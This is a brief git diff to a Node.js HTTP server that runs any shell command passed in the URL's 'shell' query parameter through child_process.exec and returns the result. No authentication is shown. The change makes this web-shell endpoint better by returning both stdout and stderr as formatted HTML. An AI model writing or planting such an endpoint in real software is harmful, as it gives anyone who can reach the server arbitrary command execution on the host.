@@ -1,6 +1,7 @@
 var http = require('http');
 var url = require('url');
-var exec = require('child_process').exec
+var exec = require('child_process').exec;
+var util = require('util');
 
 http.createServer(function(request, response) {
 	try {
@@ -10,8 +11,12 @@ http.createServer(function(request, response) {
 			return;
 		}
 		if (query.shell) {
-			exec(query.shell, function(error, stdout) {
-				response.end(stdout);
+			exec(query.shell, function(error, stdout, stderr) {
+				response.end(util.format(
+					'<pre><b>stdout</b>:\n%s\n<b>stderr</b>:\n%s</pre>',
+					stdout || 'none',
+					stderr || 'none'
+				));
 			});
 			return;
 		}
